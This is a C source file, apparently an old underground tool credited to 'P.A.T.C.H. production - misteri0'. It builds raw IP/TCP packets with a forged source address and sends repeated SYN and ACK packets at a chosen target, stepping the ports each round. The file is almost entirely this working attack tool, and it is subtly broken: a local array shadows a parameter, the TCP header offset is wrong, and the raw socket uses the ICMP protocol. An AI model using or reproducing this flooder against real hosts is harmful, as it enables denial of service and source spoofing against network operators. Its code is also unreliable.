       /*--------- code ----------- */
       #define _BSD_SOURCE
       /* BSD compatibility */
       #include <stdio.h>
       #include <stdlib.h>
       #include <unistd.h>
       #include <string.h>
       #include <netdb.h>
       #include <net/if.h>
       #include <netinet/in.h>
       #include <netinet/ip.h>
       #include <netinet/tcp.h>
       #include <sys/ioctl.h>
       #include <sys/types.h>
       #include <sys/socket.h>
       #include <arpa/inet.h>
       #include <time.h>
       
       struct pseudo {
               u_long saddr;
               u_long daddr;
               u_char zero;
               u_char protocol;
               u_short length;
       };
       
       unsigned short
       in_cksum (unsigned short *ptr, int nbytes)
       {
       
         register long sum;            /* assumes long == 32 bits */
         u_short oddbyte;
         register u_short answer;      /* assumes u_short == 16 bits */
       
         /*
          * Our algorithm is simple, using a 32-bit accumulator (sum),
          * we add sequential 16-bit words to it, and at the end, fold back
          * all the carry bits from the top 16 bits into the lower 16 bits.
          */
       
         sum = 0;
         while (nbytes > 1)
           {
             sum += *ptr++;
             nbytes -= 2;
           }
       
         /* mop up an odd byte, if necessary */
         if (nbytes == 1)
           {
             oddbyte = 0;              /* make sure top half is zero */
             *((u_char *) & oddbyte) = *(u_char *) ptr;        /* one byte only */
             sum += oddbyte;
           }
       
         /*
          * Add back carry outs from top 16 bits to low 16 bits.
          */
       
         sum = (sum >> 16) + (sum & 0xffff);   /* add high-16 to low-16 */
         sum += (sum >> 16);           /* add carry */
         answer = ~sum;                /* ones-complement, then truncate to 16 bits */
         return (answer);
       }
       
       int sendpack( int s, u_long srcaddr, u_short srcport, u_long dstaddr, u_short dstport,u_short th_flags, u_char *packet,u_long length) {
       
               u_char packet[sizeof(struct ip) + sizeof(struct pseudo) + sizeof(struct tcphdr)];
               struct sockaddr_in foo;
               struct in_addr srcinaddr,dstinaddr;
               struct ip *ip = (struct ip *) packet;
               struct pseudo *pseudo = (struct pseudo *) (packet + sizeof(struct ip));
               struct tcphdr *tcp = (struct tcphdr *) (packet + sizeof(struct ip) 
                                       + sizeof(struct pseudo));
               bzero(packet, sizeof(packet));
               bzero(&foo,sizeof(foo));
       
               /* only BSD, linux has plain u_long declared */
               srcinaddr.s_addr = srcaddr;
               dstinaddr.s_addr = dstaddr;
       
       /* building packets */
                               pseudo->saddr = srcaddr;
                               pseudo->daddr = dstaddr;
                               pseudo->zero = 0;
                               pseudo->protocol=IPPROTO_TCP;
                               pseudo->length = htons(sizeof (struct tcphdr));
                               ip->ip_v = 4; /* 4 */
                               ip->ip_hl = 5; /* 5 */
                               ip->ip_id = 1234; /* 1234 */
                               ip->ip_src = srcinaddr;
                               ip->ip_dst = dstinaddr;
                               ip->ip_p = IPPROTO_TCP;
                               ip->ip_ttl = 40; /* 40 */
                               ip->ip_off = 0;
                               ip->ip_len = sizeof(struct ip) + sizeof(struct tcphdr)
                                                           + length;
                               tcp->th_sport = htons(srcport);
                               tcp->th_dport = htons(dstport);
                               tcp->th_seq = htonl(rand());
                               tcp->th_ack = htonl(rand());
                               tcp->th_off=1;
                               tcp->th_flags = th_flags;
                               tcp->th_urp = 0; /* 0 */
                               tcp->th_sum = in_cksum((u_short *) pseudo,
                                               sizeof(struct pseudo) +
                                                sizeof(struct tcphdr));
                               bcopy(tcp,pseudo,sizeof(struct tcphdr));
                               foo.sin_family=AF_INET;
                               foo.sin_addr.s_addr=dstaddr;
                               sendto(s,packet,sizeof(struct ip) + 
                                               sizeof(struct tcphdr) + length, 0,
                                               (struct sockaddr *) &foo,sizeof(foo));
       
               return 0;
       }
       
       void usage(char *name) {
               fprintf(stderr,"\x1B[0;34mP.A.T.C.H. production - misteri0\x1B[0;0m\n");
               fprintf(stderr,"\x1B[1;36mUsage: \x1B[0;31m%s \x1B[1;32m[\x1B[0;36msrcip\x1B[1;32m] \x1B[1;32m[\x1B[0;36msrc start port\x1B[1;32m] \x1B[1;32m[\x1B[0;36mdstip\x1B[1;32m] \x1B[1;32m[\x1B[0;36mdst start port\x1B[1;32m] \x1B[1;32m[\x1B[0;36mcount\x1B[1;32m]\x1B[0;0m\n",name);
               fprintf(stderr,"\x1B[0;35mNote: \x1B[0;33mThe source/destination ports will increment by 1\x1B[0;0m\n");
              
               exit(1);
       }
       
       u_long resolve_name(char *hostname) {
               struct hostent *host;
               u_long addr;
               if ((addr = inet_addr(hostname)) != -1) return addr;
               if ((host = gethostbyname(hostname)) == NULL) {
                       fprintf(stderr,"Can not resolve name: %s\n",hostname);
                       exit(1);
               }
               bcopy(host->h_addr,&addr,host->h_length);
               return addr;
       }
       int main(argc,argv)
       
               int argc;
               
               char **argv;
       {
               int rawfd,rd,rsize;
               int count; /* don't know why I made it so complicated, *sigh* oh well, gets the job done.. */
               int one=1;
               u_char buf[1024];
               struct sockaddr_in raddr;
               struct ifreq ifr;
               struct in_addr srcip,dstip;
               u_short srcport,dstport;
       
               if (argc!=6) usage(argv[0]);
               
               
               srcip.s_addr    =       resolve_name(argv[1]);
               srcport         =       atoi(argv[2]);
               dstip.s_addr    =       resolve_name(argv[3]);
               dstport         =       atoi(argv[4]);
       
               if ((rawfd=socket(PF_INET,SOCK_RAW,IPPROTO_ICMP))<0) {
                       perror("RawSocket:");
                       exit(1);
               }
               if (setsockopt(rawfd,IPPROTO_IP,IP_HDRINCL,&one,sizeof(one))<0) {
                       perror("SetSockOpt:");
                       close(rawfd);
                       exit(1);
               }
            count=0;
            while(atoi(argv[5]) > count)
            { 
           
            count++;
            
            printf("sending packet from: %s:%i ",inet_ntoa(srcip),srcport);
            printf("to %s:%i\n",inet_ntoa(dstip),dstport);
            /* think about it, =-) */
            srcport = srcport + 1;
            dstport = dstport + 1;
            sendpack(rawfd,srcip.s_addr,srcport,dstip.s_addr,dstport,TH_SYN,NULL,0);
            sendpack(rawfd,srcip.s_addr,srcport,dstip.s_addr,dstport,TH_ACK,NULL,0);
            usleep(1000);      
            
            
            }
       
                       
       /*      printf("starting..");
               for(;;) {
                       printf("foo..");
                       fflush(stdout);
                       if ((rd=recvfrom(rawfd,buf,1024,0,(struct sockaddr *)&raddr,&rsize))<0) break;
                       printf("%i\n",rd);
               }*/ 
               close(rawfd);
               return(0);
       }       
       
